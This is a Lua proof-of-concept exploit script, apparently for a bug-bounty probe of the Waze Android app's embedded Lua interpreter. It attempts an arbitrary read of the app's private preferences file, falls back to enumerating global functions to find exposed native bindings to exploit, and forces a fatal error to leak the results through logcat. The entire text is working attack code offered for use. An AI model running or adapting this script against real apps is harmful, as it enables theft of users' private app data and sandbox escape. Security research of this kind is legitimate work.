local function exploit()
    local dump = ""
    
    -- Attempt 1: Test for Arbitrary File Read (Theft of Sensitive Data)
    if io and io.open then
        local f = io.open("/data/data/com.waze/shared_prefs/WAZE_MAIN_PREFS.xml", "r")
        if f then 
            local content = f:read("*a")
            dump = "FILE_READ_SUCCESS: " .. string.sub(content, 1, 150)
            f:close()
        else
            dump = "FILE_READ_FAILED_BUT_IO_EXISTS"
        end
    else
        -- Attempt 2: If 'io' is sandboxed, dump all global functions to logcat
        -- This will tell us if Waze left any custom C-bindings exposed that we can exploit
        dump = "GLOBALS_DUMP: "
        for k, v in pairs(_G) do 
            dump = dump .. k .. "=" .. type(v) .. " | " 
        end
    end
    
    -- Force a fatal Lua error to trigger the C++ exception handler and print to logcat
    error("CRITICAL_BOUNTY_PAYLOAD ---> " .. dump)
end

-- Execute in a protected call to ensure it runs
pcall(exploit)
-- Trigger the error so it prints
exploit()